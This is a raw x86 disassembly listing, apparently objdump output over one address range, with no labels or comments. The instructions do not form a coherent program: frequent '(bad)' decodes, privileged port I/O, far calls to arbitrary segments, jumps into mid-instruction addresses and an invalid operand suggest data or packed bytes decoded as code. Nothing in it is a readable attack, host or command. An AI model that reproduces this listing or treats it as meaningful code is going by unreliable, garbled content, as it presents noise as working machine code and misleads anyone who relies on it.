  416722:	imul   esi,DWORD PTR [ebp+0xe],0x2fab0243
  416729:	in     al,0xc2
  41672b:	sbb    DWORD PTR [esi-0x80],0x5e903d8b
  416732:	sti    
  416733:	xor    esi,DWORD PTR [eax-0x67]
  416736:	add    dl,BYTE PTR [edi]
  416738:	mov    eax,ds:0x106cf4c6
  41673d:	iret   
  41673e:	addr16 sub ebp,ecx
  416741:	popa   
  416742:	shl    BYTE PTR [edx-0x50017b7b],1
  416748:	inc    ebx
  416749:	sahf   
  41674a:	sub    eax,0xee27e11b
  41674f:	sbb    BYTE PTR [esi+0x5d],bh
  416752:	push   0xabe3b216
  416757:	push   ebp
  416758:	pop    esi
  416759:	int    0x42
  41675b:	cmp    al,0x75
  41675d:	mov    eax,ds:0x24d6caa1
  416762:	pop    esp
  416763:	popa   
  416764:	inc    ebx
  416765:	lods   eax,DWORD PTR ds:[esi]
  416766:	add    DWORD PTR ds:0x641ddb5b,0xffffff9c
  41676d:	(bad)  
  41676e:	and    edx,edx
  416770:	or     edx,ecx
  416772:	sti    
  416773:	std    
  416774:	sub    dh,BYTE PTR [edi+0x652f7089]
  41677a:	jle    0x416789
  41677c:	inc    eax
  41677d:	retf   0x57fe
  416780:	int3   
  416781:	xor    bl,BYTE PTR fs:[esi]
  416784:	adc    dl,BYTE PTR [ebp+0x50f81af7]
  41678a:	test   eax,0xa58a82a3
  41678f:	lods   eax,DWORD PTR ds:[esi]
  416790:	jl     0x416727
  416792:	xchg   BYTE PTR [esi+0x115365e5],ch
  416798:	cmc    
  416799:	mov    ds:0x1d66eda7,al
  41679e:	jp     0x41679f
  4167a0:	xlat   BYTE PTR ds:[ebx]
  4167a1:	fsubr  QWORD PTR ds:0xec7bffea
  4167a7:	call   0x8a6f:0xb537d2e5
  4167ae:	inc    edx
  4167af:	cmp    eax,0x28f77004
  4167b4:	fstp   DWORD PTR [ecx]
  4167b6:	(bad)  
  4167b7:	gs out 0xb7,eax
  4167ba:	xchg   esi,eax
  4167bb:	div    BYTE PTR [esi-0x24]
  4167be:	push   esi
  4167bf:	sbb    eax,0xd278a1e3
  4167c4:	aad    0xb1
  4167c6:	jne    0x4167bb
  4167c8:	push   0xf081af42
  4167cd:	scas   eax,DWORD PTR es:[edi]
  4167ce:	fmul   QWORD PTR [esp+ebx*4+0x4c]
  4167d2:	mov    dh,BYTE PTR [edi-0x44304001]
  4167d8:	push   cs
  4167d9:	jp     0x416849
  4167db:	leave  
  4167dc:	(bad)  
  4167dd:	stos   BYTE PTR es:[edi],al
  4167de:	xor    bh,0xa7
  4167e1:	loop   0x41685e
  4167e3:	fldcw  WORD PTR [edx+0x6f59be86]
  4167e9:	(bad)  
  4167ea:	sti    
  4167eb:	xor    BYTE PTR [ecx],bh
  4167ed:	stos   BYTE PTR es:[edi],al
  4167ee:	inc    ebx
  4167ef:	ficom  WORD PTR [edi]
  4167f1:	jo     0x416800
  4167f3:	loop   0x4167e1
  4167f5:	shl    bl,1
  4167f7:	test   DWORD PTR [eax+0x4ad7ede3],0x96c5f53a
  416801:	inc    edx
  416802:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  416804:	ja     0x41684f
  416806:	into   
  416807:	jmp    0x416813
  416809:	hlt    
  41680a:	mov    esp,0xbc843d3e
  41680f:	(bad)  
  416810:	fisubr DWORD PTR [eax]
  416812:	loope  0x4167c3
  416814:	inc    edx
  416815:	push   edi
  416816:	lahf   
  416817:	and    al,0xee
  416819:	xor    eax,0x476c75bd
  41681e:	jg     0x41688c
  416820:	mov    bh,0x95
  416822:	cmp    al,0xec
  416824:	in     al,dx
  416825:	mov    ebp,0xd67c89fc
  41682a:	rol    ebx,0x5b
  41682d:	cli    
  41682e:	fwait
  41682f:	cwde   
  416830:	or     BYTE PTR [esi+0xd],bl
  416833:	pop    ss
  416834:	scas   al,BYTE PTR es:[edi]
  416835:	pop    esp
  416836:	add    eax,DWORD PTR [ecx+0x2ec26326]
  41683c:	inc    eax
  41683d:	sbb    al,0xdd
  41683f:	dec    edx
  416840:	xlat   BYTE PTR ds:[ebx]
  416841:	mov    edx,0xfe5efb75
  416846:	rcl    dh,cl
  416848:	mov    WORD PTR [ebp+ebx*8+0x3c49ceef],es
  41684f:	aad    0x79
  416851:	jno    0x41685f
  416853:	pushf  
  416854:	lock call 0x17e40a46
  41685a:	(bad)  
  41685b:	fisttp DWORD PTR [ecx-0x7fed536e]
  416861:	push   eax
  416862:	cdq    
  416863:	aad    0x73
  416865:	loop   0x416810
  416867:	sbb    DWORD PTR [edi+0x40],esi
  41686a:	and    BYTE PTR [ecx+ecx*8],dh
  41686d:	rcl    BYTE PTR [ecx-0x431e966e],1
  416873:	jge    0x416867
  416875:	in     eax,0x76
  416877:	jle    0x416896
  416879:	and    al,0xbf
  41687b:	pop    ds
  41687c:	sub    DWORD PTR [edx+0x691ba716],esi
  416882:	ss out dx,al
  416884:	xor    ah,ch
  416886:	inc    eax
  416887:	cli    
  416888:	popf   
  416889:	xchg   edx,eax
  41688a:	test   DWORD PTR cs:[ebp-0x67f6a017],edi
  416891:	pop    ss
  416892:	cmp    cl,BYTE PTR [edi+edi*8+0x3f060c17]
  416899:	adc    DWORD PTR [ecx-0x55],edi
  41689c:	add    DWORD PTR [esi],eax
  41689e:	jle    0x416841
  4168a0:	fnstcw WORD PTR [ecx+0x695237eb]
  4168a6:	dec    di
  4168a8:	push   esp
  4168a9:	pop    edx
  4168aa:	sub    esp,ebx
  4168ac:	inc    ebp
  4168ad:	mov    bh,0x20
  4168af:	push   edi
  4168b0:	adc    ecx,esi
  4168b2:	jl     0x416922
  4168b4:	add    al,0x5
  4168b6:	lahf   
  4168b7:	cmp    eax,0x95ae865b
  4168bc:	inc    edi
  4168bd:	push   eax
  4168be:	mov    esp,cs
  4168c0:	out    dx,al
  4168c1:	jmp    0x29d784b
  4168c6:	rol    DWORD PTR [edx+0x612fe465],1
  4168cc:	enter  0xd9d5,0x30
  4168d0:	out    dx,eax
  4168d1:	adc    al,0xa2
  4168d3:	push   cs
  4168d4:	add    al,0x71
  4168d6:	cmp    bh,BYTE PTR [edx-0x60]
  4168d9:	mov    ebp,0xdc89f535
  4168de:	(bad)  
  4168df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168e0:	aad    0x1b
  4168e2:	mov    esi,0x1f5fe787
  4168e7:	scas   eax,DWORD PTR es:[edi]
  4168e8:	fwait
  4168e9:	dec    ebp
  4168ea:	call   0xab7a:0x9356520d
  4168f1:	dec    esi
  4168f2:	push   ecx
  4168f3:	inc    ecx
  4168f4:	cmp    eax,0x66b5b0a3
  4168f9:	ins    DWORD PTR es:[edi],dx
  4168fa:	sahf   
  4168fb:	mov    esp,0x26ffcd6b
  416900:	jbe    0x41693d
  416902:	(bad)  
  416903:	test   eax,0x4963a781
  416908:	mov    ecx,DWORD PTR [ecx-0x20]
  41690b:	sub    ch,bh
  41690d:	in     eax,0x98
  41690f:	adc    al,BYTE PTR [eax+0x6a52c906]
  416915:	jb     0x4168ca
  416917:	mov    bh,BYTE PTR [eax-0x20ea9f17]
  41691d:	dec    esi
  41691e:	xchg   ecx,eax
  41691f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416920:	cmp    DWORD PTR ds:0xc7c3a58,eax
  416926:	enter  0xe58e,0x69
  41692a:	enter  0x7518,0x7e
  41692e:	sub    dh,BYTE PTR [edi+0x6e4cb73]
  416934:	xor    al,0xb0
  416936:	mov    WORD PTR [edi],gs
  416938:	jnp    0x41690f
  41693a:	xor    eax,0x513af443
  41693f:	repnz stc 
  416941:	adc    al,BYTE PTR [ebx-0x76]
  416944:	mov    ah,0xe
  416946:	or     ah,BYTE PTR [esi-0x50049e8e]
  41694c:	hlt    
  41694d:	push   ss
  41694e:	outs   dx,BYTE PTR ds:[esi]
  41694f:	jnp    0x4169b8
  416951:	push   0xffffffa2
  416953:	ret    
  416954:	push   ebp
  416955:	stos   DWORD PTR es:[edi],eax
  416956:	fidiv  WORD PTR [edi+ebp*2+0x58]
  41695a:	adc    eax,0x866e846e
  41695f:	ror    DWORD PTR [ecx-0x4d],0x22
  416963:	inc    ebx
  416964:	xchg   edi,esp
  416966:	adc    dh,BYTE PTR [esi-0x17]
  416969:	aam    0x7a
  41696b:	(bad)  
  41696c:	dec    esp
  41696d:	dec    ebx
  41696e:	sbb    BYTE PTR [ebp+0x5a],dh
  416971:	cwde   
  416972:	sub    al,0xcf
  416974:	adc    al,0x40
  416976:	iret   
  416977:	xor    bh,BYTE PTR [edx+esi*4-0x15]
  41697b:	aam    0x15
  41697d:	jae    0x416961
  41697f:	inc    ebp
  416980:	xchg   ebx,ecx
  416982:	jmp    0x416c66
  416987:	cmc    
  416988:	std    
  416989:	fs mov ah,0x74
  41698c:	jno    0x416983
  41698e:	mov    ecx,0x2f2f76b9
  416993:	popf   
  416994:	dec    esi
  416995:	inc    esi
  416996:	dec    ecx
  416997:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416998:	pop    ds
  416999:	jg     0x416a0b
  41699b:	mov    ecx,0xb470707e
  4169a0:	pushf  
  4169a1:	test   BYTE PTR [ebx],ah
  4169a3:	xor    DWORD PTR [ebx-0x7e],eax
  4169a6:	ins    BYTE PTR es:[edi],dx
  4169a7:	stos   DWORD PTR es:[edi],eax
  4169a8:	js     0x4169d6
  4169aa:	mov    ebx,0x4ab06b88
  4169af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169b0:	mov    al,0xc1
  4169b2:	xor    BYTE PTR [ebx-0x1d],bh
  4169b5:	ret    
  4169b6:	inc    ecx
  4169b7:	pop    ds
  4169b8:	dec    esp
  4169b9:	mov    eax,0x2c1a327c
  4169be:	lahf   
  4169bf:	daa    
  4169c0:	test   eax,0xbe6b62d0
  4169c5:	push   esi
  4169c6:	pop    es
  4169c7:	addr16 jns 0x416a1c
  4169ca:	xchg   DWORD PTR [edi+eiz*8],eax
  4169cd:	cvtdq2ps xmm6,XMMWORD PTR [esi-0x6b]
  4169d1:	add    esi,0xf
  4169d4:	mov    BYTE PTR [edx+0xb09b4dc],cl
  4169da:	pop    edx
  4169db:	stos   DWORD PTR es:[edi],eax
  4169dc:	inc    eax
  4169dd:	pop    esi
  4169de:	xchg   ebp,eax
  4169df:	(bad)  [esi+esi*4]
  4169e2:	outs   dx,BYTE PTR ds:[esi]
  4169e3:	(bad)  ds:0xc7c811e2
  4169e9:	ins    BYTE PTR es:[edi],dx
  4169ea:	jbe    0x4169e4
  4169ec:	sti    
  4169ed:	cmc    
  4169ee:	ds push ds
  4169f0:	xlat   BYTE PTR ds:[ebx]
  4169f1:	jp     0x4169f7
  4169f3:	sbb    ebp,DWORD PTR [ecx]
  4169f5:	and    DWORD PTR [edx],edx
  4169f7:	jge    0x4169e7
  4169f9:	or     DWORD PTR [ebx-0x3d5a6d36],ebp
  4169ff:	mov    bh,0x56
  416a01:	ja     0x4169cc
  416a03:	aas    
  416a04:	pop    esp
  416a05:	test   DWORD PTR [esi+ebx*4+0xb],ecx
  416a09:	les    ecx,FWORD PTR [edx+0x19]
  416a0c:	push   cs
  416a0d:	shl    DWORD PTR [esi+0x2d],1
  416a10:	mov    dh,0x65
  416a12:	out    dx,eax
  416a13:	lds    edx,FWORD PTR [ebx+0x33]
  416a16:	sar    BYTE PTR [ebx+0x6046876],1
  416a1c:	test   DWORD PTR [ebx],edx
  416a1e:	xchg   ebx,eax
  416a1f:	push   edx
  416a20:	lods   eax,DWORD PTR ds:[esi]
  416a21:	popa   
  416a22:	outs   dx,BYTE PTR ds:[esi]
  416a23:	push   ecx
  416a24:	js     0x416a40
  416a26:	adc    BYTE PTR [ecx+0x46bcf5a9],0xd5
  416a2d:	push   cs
  416a2e:	repz fs inc ebp
  416a31:	dec    ecx
  416a32:	cmp    eax,DWORD PTR [ebp+0x3fb5d2ba]
  416a38:	in     eax,dx
  416a39:	add    al,0xac
  416a3b:	jnp    0x416a0a
  416a3d:	ror    BYTE PTR [ebp+0x942a0db],0x55
  416a44:	add    al,0x79
  416a46:	dec    esp
  416a47:	adc    edx,DWORD PTR [ebp-0x69]
  416a4a:	arpl   WORD PTR ds:0x5a84a0bb,ax
  416a50:	fs loop 0x416acd
  416a53:	hlt    
  416a54:	push   ecx
  416a55:	inc    ebp
  416a56:	inc    edx
  416a57:	mov    ch,0x7a
  416a59:	inc    esi
  416a5a:	add    BYTE PTR [edx+0x4e],ah
  416a5d:	and    bh,BYTE PTR [edx+ebp*8]
  416a60:	inc    eax
  416a61:	loope  0x416ace
  416a63:	(bad)  
  416a64:	dec    ecx
  416a65:	mov    dl,0x6b
  416a67:	add    ah,BYTE PTR [ebp-0x12da54e5]
  416a6d:	repz push esp
  416a6f:	inc    ebp
  416a70:	scas   eax,DWORD PTR es:[edi]
  416a71:	pop    ecx
  416a72:	mov    DWORD PTR [ebx+ebx*1-0x3d03a0d7],edi
  416a79:	test   DWORD PTR [esi+0x76],0x54e9734e
  416a80:	cli    
  416a81:	xor    DWORD PTR [ebp-0x31e45a55],edi
  416a87:	push   0xa0d57fad
  416a8c:	push   ebx
  416a8d:	outs   dx,DWORD PTR ds:[esi]
  416a8e:	ret    0x7be5
  416a91:	xor    al,BYTE PTR [ebx]
  416a93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a94:	adc    eax,0x90fdb837
  416a99:	test   eax,0x3690fca8
  416a9e:	fist   WORD PTR [esi-0x28]
  416aa1:	jmp    0xa84b3a06
  416aa6:	or     eax,0x344f118c
  416aab:	cmp    edx,DWORD PTR [ebx+0x23]
  416aae:	adc    eax,0xd8a01237
  416ab3:	or     DWORD PTR [ebx+0x4a],esi
  416ab6:	mov    ecx,0x1fc6939
  416abb:	adc    BYTE PTR [edi],dl
  416abd:	jl     0x416b3a
  416abf:	sub    edx,DWORD PTR [edi+ebp*1+0x22]
  416ac3:	or     bl,BYTE PTR ds:0xfd0828a4
  416ac9:	(bad)  
  416acb:	addr16 leave 
  416acd:	out    dx,eax
  416ace:	sub    dh,BYTE PTR [eax+esi*4]
  416ad1:	mov    edx,0x754a80a7
  416ad6:	out    dx,eax
  416ad7:	scas   al,BYTE PTR es:[edi]
  416ad8:	jle    0x416b4b
  416ada:	cmc    
  416adb:	bound  eax,QWORD PTR [edx-0x5e]
  416ade:	dec    ebp
  416adf:	pmaddwd mm0,QWORD PTR [ebp+0x489cc551]
  416ae6:	das    
  416ae7:	jl     0x416b5d
  416ae9:	fs push edi
  416aeb:	aad    0xb3
  416aed:	retf   0xd8c1
  416af0:	dec    edx
  416af1:	push   edi
  416af2:	jg     0x416b58
  416af4:	retf   
  416af5:	pop    edx
  416af6:	jge    0x416b73
  416af8:	das    
  416af9:	mov    edi,DWORD PTR [edx+eiz*4]
  416afc:	pop    edx
  416afd:	retf   0x3392
  416b00:	cdq    
  416b01:	into   
  416b02:	gs scas eax,DWORD PTR es:[edi]
  416b04:	or     bl,ah
  416b06:	and    ch,BYTE PTR [ebp+edx*1+0x1d]
  416b0a:	(bad)  
  416b0b:	ss lock jmp 0x50508a12
  416b12:	js     0x416b44
  416b14:	adc    ch,dl
  416b16:	xchg   ecx,eax
  416b17:	inc    ebx
  416b18:	jbe    0x416b56
  416b1a:	bound  esp,QWORD PTR [edx+0x52]
  416b1d:	cmp    DWORD PTR [ebp-0x6fd709a],0x6ee326d2
  416b27:	push   ebx
  416b28:	fcom   QWORD PTR [ebp*8+0x1d67844b]
  416b2f:	xor    al,0xf4
  416b31:	mov    bh,BYTE PTR [ebp-0x2e]
  416b34:	imul   ebx,DWORD PTR [edx+edi*2-0x4d022351],0xea1b27a2
  416b3f:	push   es
  416b40:	xchg   ebx,eax
  416b41:	outs   dx,DWORD PTR ds:[esi]
  416b42:	jg     0x416b5e
  416b44:	dec    ebx
  416b45:	loopne 0x416ae6
  416b47:	mov    ebx,0xaf1b7806
  416b4c:	lds    edx,FWORD PTR [ebp+edx*2-0x30]
  416b50:	adc    bl,BYTE PTR [esi+0x4]
  416b53:	repnz fcmovnbe st,st(7)
  416b56:	loopne 0x416bae
  416b58:	cmp    edi,ebp
  416b5a:	pushf  
  416b5b:	imul   ebx,DWORD PTR [edx+eax*8],0x51
  416b5f:	int    0xf6
  416b61:	or     al,BYTE PTR ds:0xaa2a7faf
  416b67:	setge  BYTE PTR [ebx-0x5571a63a]
  416b6e:	cld    
  416b6f:	nop
  416b70:	mov    eax,ds:0x40b9215a
  416b75:	in     eax,0xe8
  416b77:	cs das 
  416b79:	jns    0x416bc6
  416b7b:	adc    eax,0x9071c511
  416b80:	pop    ds
  416b81:	xlat   BYTE PTR ds:[ebx]
  416b82:	inc    ebp
  416b83:	cs xlat BYTE PTR cs:[ebx]
  416b86:	adc    al,0xdd
  416b88:	(bad)  
  416b89:	iret   
  416b8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b8b:	inc    esp
  416b8c:	jmp    0x416b45
  416b8e:	adc    BYTE PTR [ebp+0x5611abc0],dh
  416b94:	xor    edx,esi
  416b96:	es stos BYTE PTR es:[edi],al
  416b98:	or     DWORD PTR [edx-0x1a192bd0],esp
  416b9e:	pop    ebp
  416b9f:	push   esi
  416ba0:	cmc    
  416ba1:	xor    DWORD PTR [eax+0x74d31389],esp
  416ba7:	pop    esi
  416ba8:	push   ebx
  416ba9:	stc    
  416baa:	push   cs
  416bab:	sbb    ebx,ecx
  416bad:	mov    ebx,0x305304d9
  416bb2:	dec    ebx
  416bb3:	jg     0x416b83
  416bb5:	mov    ds:0x8675fbfb,al
  416bba:	mov    ebx,0x9eb9dba9
  416bbf:	sub    dh,cl
  416bc1:	push   ebp
  416bc2:	aaa    
  416bc3:	sub    dl,bh
  416bc5:	push   esi
  416bc6:	stos   DWORD PTR es:[edi],eax
  416bc7:	test   eax,0x51f65bb6
  416bcc:	and    dh,dh
  416bce:	inc    ecx
  416bcf:	pop    edi
  416bd0:	and    dh,BYTE PTR [eax+esi*4+0x6]
  416bd4:	sub    dl,BYTE PTR [edx]
  416bd6:	pop    eax
  416bd7:	mov    al,0xdc
  416bd9:	adc    dl,bh
  416bdb:	iret   
  416bdc:	xor    al,0x50
  416bde:	cmp    ebp,DWORD PTR [eax]
  416be0:	dec    ecx
  416be1:	cli    
  416be2:	ins    BYTE PTR es:[edi],dx
  416be3:	pop    esi
  416be4:	sahf   
  416be5:	mov    bl,0x13
  416be7:	pop    esi
  416be8:	sub    al,0x7
  416bea:	inc    ebp
  416beb:	sub    al,0x37
  416bed:	ror    BYTE PTR [edi-0x11],0x54
  416bf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bf2:	cli    
  416bf3:	mov    WORD PTR [ebp+0x5d66b1ba],ds
  416bf9:	scas   eax,DWORD PTR es:[edi]
  416bfa:	push   es
  416bfb:	jne    0x416b9e
  416bfd:	add    eax,0xffb2e72a
  416c02:	jle    0x416c3f
  416c04:	cwde   
  416c05:	(bad)  
  416c06:	imul   eax,DWORD PTR [ebx-0x4e],0x26
  416c0a:	adc    BYTE PTR [edx],dl
  416c0c:	or     eax,DWORD PTR [ecx+0x71602fd5]
  416c12:	and    al,0xc1
  416c14:	cmc    
  416c15:	push   es
  416c16:	aad    0xb1
  416c18:	test   BYTE PTR [ebp+ebx*2+0x6b1b3cf7],cl
  416c1f:	push   eax
  416c20:	outs   dx,BYTE PTR ds:[esi]
  416c21:	adc    ch,cl
  416c23:	mov    ebx,0xd7ddaaef
  416c28:	or     BYTE PTR [ebp-0x2a],al
  416c2b:	test   edi,esi
  416c2d:	mov    cl,0xd7
  416c2f:	xchg   esi,eax
  416c30:	xchg   ebp,eax
  416c31:	jns    0x416caf
  416c33:	inc    ecx
  416c34:	add    esp,ebx
  416c36:	into   
  416c37:	or     dl,dh
  416c39:	xor    al,0xb2
  416c3b:	sbb    BYTE PTR [eax-0x70],bh
  416c3e:	retf   
  416c3f:	fdiv   DWORD PTR [ebx+0x72]
  416c42:	sti    
  416c43:	mov    DWORD PTR [eax-0x3e],esi
  416c46:	repz and eax,0x26ad1f9
  416c4c:	ror    dh,0x94
  416c4f:	ins    DWORD PTR es:[edi],dx
  416c50:	sub    esp,DWORD PTR [edi-0x8fb7e0a]
  416c56:	je     0x416cc6
  416c58:	inc    edi
  416c59:	stc    
  416c5a:	in     eax,dx
  416c5b:	and    ebp,DWORD PTR [ecx]
  416c5d:	ja     0x416bf5
  416c5f:	jbe    0x416c53
  416c61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c62:	dec    esp
  416c63:	mov    eax,0x8b4918d5
  416c68:	inc    ebp
  416c69:	in     al,0xe9
  416c6b:	fild   WORD PTR [edx]
  416c6d:	add    BYTE PTR [eax],al
  416c6f:	outs   dx,BYTE PTR ds:[esi]
  416c70:	ds push eax
  416c72:	loopne 0x416cd4
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	outs   dx,BYTE PTR ds:[esi]
  416c76:	mov    esi,0xcbfa089
  416c7b:	out    0xaf,al
  416c7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c7e:	shr    esi,1
  416c80:	sbb    al,0x7f
  416c82:	jo     0x416c3d
  416c84:	jle    0x416cf6
  416c86:	jo     0x416c60
  416c88:	xchg   DWORD PTR [esi-0x24dc0f36],ebx
  416c8e:	pop    ebp
  416c8f:	sbb    cl,BYTE PTR [esi-0x78e726c7]
  416c95:	dec    ebp
  416c96:	dec    ecx
  416c97:	sub    BYTE PTR [ebx+ebx*2-0x3ab13055],bh
  416c9e:	cld    
  416c9f:	fadd   DWORD PTR [edx+eax*1+0x6b]
  416ca3:	xlat   BYTE PTR ds:[ebx]
  416ca4:	fstp   DWORD PTR [ecx+0x23]
  416ca7:	mov    ah,BYTE PTR [edx]
  416ca9:	mov    ch,0x93
  416cab:	in     al,0xaa
  416cad:	lahf   
  416cae:	je     0x416cc8
  416cb0:	xchg   edi,eax
  416cb1:	pop    eax
  416cb2:	dec    ebp
  416cb3:	aas    
  416cb4:	addr16 sub al,0x43
  416cb7:	or     al,0xc9
  416cb9:	stos   DWORD PTR es:[edi],eax
  416cba:	es cmp edi,edi
  416cbd:	cmp    eax,0x5c4b744b
  416cc2:	imul   BYTE PTR [edx]
  416cc4:	or     ebx,DWORD PTR [ebp+0x6d03363f]
  416cca:	(bad)  
  416ccb:	ret    0x3194
  416cce:	sbb    BYTE PTR [eax-0x47a40717],bl
  416cd4:	xchg   esp,eax
  416cd5:	dec    ebp
  416cd6:	arpl   WORD PTR [eax-0x26],sp
  416cd9:	cs out 0x78,eax
  416cdc:	sbb    cl,BYTE PTR [eax+0x4e]
  416cdf:	mov    esp,0xfb84a451
  416ce4:	es into 
  416ce6:	mov    gs,WORD PTR [esi+ecx*4-0x66c757c1]
  416ced:	sar    DWORD PTR [esi],1
  416cef:	mov    ?,WORD PTR [ecx-0x7de0353c]
  416cf5:	inc    esp
  416cf6:	dec    ebp
  416cf7:	cmc    
  416cf8:	pop    eax
  416cf9:	dec    ecx
  416cfa:	lahf   
  416cfb:	cmp    DWORD PTR [eax+0x4a],0xafe4aa46
  416d02:	jg     0x416ca3
  416d04:	dec    ebx
  416d05:	adc    DWORD PTR ds:0x5eec90c5,esp
  416d0b:	(bad)  [ecx]
  416d0d:	cmp    BYTE PTR [edx],bh
  416d0f:	mov    esi,0x4ac7f4d0
  416d14:	push   ebp
  416d15:	inc    ecx
  416d16:	push   es
  416d17:	cmp    DWORD PTR [edi+0x3700446],esi
  416d1d:	xor    al,0x58
  416d1f:	mov    esp,0x872b7b50
  416d24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d25:	dec    esp
  416d26:	ja     0x416cb6
  416d28:	or     DWORD PTR [edx],edx
  416d2a:	or     BYTE PTR [ebx],ch
  416d2c:	dec    edi
  416d2d:	test   al,0x84
  416d2f:	les    esi,FWORD PTR [ebx+0x39]
  416d32:	and    eax,0x39941d0b
  416d37:	mov    ds,WORD PTR [esi+0x6ee3fb4]
  416d3d:	cmp    cl,0x90
  416d40:	pusha  
  416d41:	out    dx,eax
  416d42:	jno    0x416cde
  416d44:	mov    ah,0x91
  416d46:	imul   ebp,DWORD PTR [esi-0x45],0xffffffe8
  416d4a:	and    DWORD PTR [esi],0x43
  416d4d:	mov    edi,0x22235e9a
  416d52:	pop    esp
  416d53:	and    ebp,DWORD PTR [edi-0x76bd5b4a]
  416d59:	retf   0x469f
  416d5c:	addr16 mov eax,ds
  416d5f:	sub    dh,ah
  416d61:	scas   al,BYTE PTR es:[edi]
  416d62:	je     0x416dc1
  416d64:	inc    esp
  416d65:	es cwde 
  416d67:	ins    BYTE PTR es:[edi],dx
  416d68:	retf   0x630a
  416d6b:	cmp    al,0x8a
  416d6d:	ret    
  416d6e:	loop   0x416d6e
  416d70:	add    al,0x56
  416d72:	jno    0x416cfc
  416d74:	sub    eax,0x37d84276
  416d79:	cmp    al,0x84
  416d7b:	lock fild DWORD PTR [eax-0x3433a5e7]
  416d82:	fcomp  DWORD PTR [eax-0x20]
  416d85:	mov    eax,ds:0xe09644df
  416d8a:	and    al,0x28
  416d8c:	or     ah,al
  416d8e:	cmp    eax,0xd506f1f4
  416d93:	pop    esp
  416d94:	sbb    ebx,ecx
  416d96:	xchg   esp,eax
  416d97:	fs enter 0xfb43,0x67
  416d9c:	les    eax,FWORD PTR [edx-0x69]
  416d9f:	scas   eax,DWORD PTR es:[edi]
  416da0:	stc    
  416da1:	pop    ebx
  416da2:	out    dx,al
  416da3:	and    al,0x18
  416da5:	jae    0x416dc4
  416da7:	(bad)  
  416da8:	sub    ch,dh
  416daa:	clc    
  416dab:	xlat   BYTE PTR ds:[ebx]
  416dac:	xchg   ebx,eax
  416dad:	lock adc ebp,DWORD PTR [eax]
  416db0:	jecxz  0x416d59
  416db2:	pop    ebp
  416db3:	std    
  416db4:	in     al,dx
  416db5:	pop    esi
  416db6:	dec    edx
  416db7:	adc    al,0xac
  416db9:	push   edx
  416dba:	and    dl,BYTE PTR [edx+0xf5097e5]
  416dc0:	outs   dx,DWORD PTR ds:[esi]
  416dc1:	xor    BYTE PTR [ecx+0x2ab7ad1b],bl
  416dc7:	call   0xd0ff:0xe328a55d
  416dce:	mov    esi,DWORD PTR [edi-0x3d]
  416dd1:	adc    al,0x51
  416dd3:	mov    edi,0x5e75285c
  416dd8:	rol    ecx,1
  416dda:	jge    0x416e3f
  416ddc:	jns    0x416e4b
  416dde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ddf:	mov    cl,BYTE PTR [ecx]
  416de1:	cwde   
  416de2:	xor    DWORD PTR [ebx+0x13],esi
  416de5:	jno    0x416e5f
  416de7:	fnstcw WORD PTR [ebx]
  416de9:	mov    edx,0xfd9cacdf
  416dee:	and    BYTE PTR [eax+0x178a9247],bl
  416df4:	push   ecx
  416df5:	cs mov esp,0xb94fabbb
  416dfb:	dec    ebp
  416dfc:	mov    bl,ah
  416dfe:	mov    edi,0xb48f995f
  416e03:	sbb    bl,BYTE PTR [ebx]
  416e05:	jp     0x416dc0
  416e07:	fdivr  QWORD PTR [esi-0x39]
  416e0a:	push   0x7abaa6f
  416e0f:	cmp    DWORD PTR [ecx],ebx
  416e11:	inc    ebx
  416e12:	sbb    eax,0xedc30fb6
  416e17:	mov    WORD PTR [esi],cs
  416e19:	jecxz  0x416da3
  416e1b:	inc    ebp
  416e1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e1d:	adc    al,0x1f
  416e1f:	shr    BYTE PTR [esp+ecx*2+0x5de24f31],1
  416e26:	xchg   esi,eax
  416e27:	ret    0xc9a7
  416e2a:	dec    esp
  416e2b:	(bad)  
  416e2c:	(bad)  
  416e2d:	and    dl,BYTE PTR [eax+0x65ae3563]
  416e33:	jo     0x416e95
  416e35:	or     BYTE PTR [ebp-0x71],dh
  416e38:	dec    ecx
  416e39:	push   0xffffffb9
  416e3b:	mov    WORD PTR [ebx],fs
  416e3d:	je     0x416e1e
  416e3f:	or     al,0x57
  416e41:	sub    DWORD PTR [edi-0x80],ebp
  416e44:	dec    dl
  416e46:	int3   
  416e47:	sti    
  416e48:	cmp    bx,bx
  416e4b:	mov    cl,0x4
  416e4d:	nop
  416e4e:	cmp    DWORD PTR [esi+0x53],ebx
  416e51:	and    edx,ecx
  416e53:	dec    esp
  416e54:	callw  0xbe00
  416e58:	mov    edi,0xbea50368
  416e5d:	fdiv   DWORD PTR [ebp-0x1e]
  416e60:	mov    al,0xf0
  416e62:	dec    esp
  416e63:	push   esi
  416e64:	fcom   DWORD PTR [eax+0x7d95a695]
  416e6a:	push   0x59
  416e6c:	lods   al,BYTE PTR ds:[esi]
  416e6d:	ror    DWORD PTR ds:0x1753d61c,cl
  416e73:	and    eax,0x2cd12c49
  416e78:	sub    BYTE PTR [ecx],bh
  416e7a:	dec    edx
  416e7b:	cwde   
  416e7c:	sbb    DWORD PTR [esi-0x5b6bc067],ebx
  416e82:	pop    ss
  416e83:	pusha  
  416e84:	lds    esp,FWORD PTR [esi+0x43]
  416e87:	fs std 
  416e89:	retf   
  416e8a:	int3   
  416e8b:	cmp    al,0xf4
  416e8d:	loop   0x416e55
  416e8f:	ins    BYTE PTR es:[edi],dx
  416e90:	mov    al,ds:0x20832fca
  416e95:	loope  0x416ee4
  416e97:	call   0xb3d1c0b4
  416e9c:	out    dx,eax
  416e9d:	retf   0xdda7
  416ea0:	xlat   BYTE PTR ds:[ebx]
  416ea1:	sub    ah,BYTE PTR [edi-0x50]
  416ea4:	jmp    0x416f0d
  416ea6:	cmp    al,0x5a
  416ea8:	jb     0x416eb6
  416eaa:	mov    ch,0xdc
  416eac:	rcl    DWORD PTR [esi+eiz*1],1
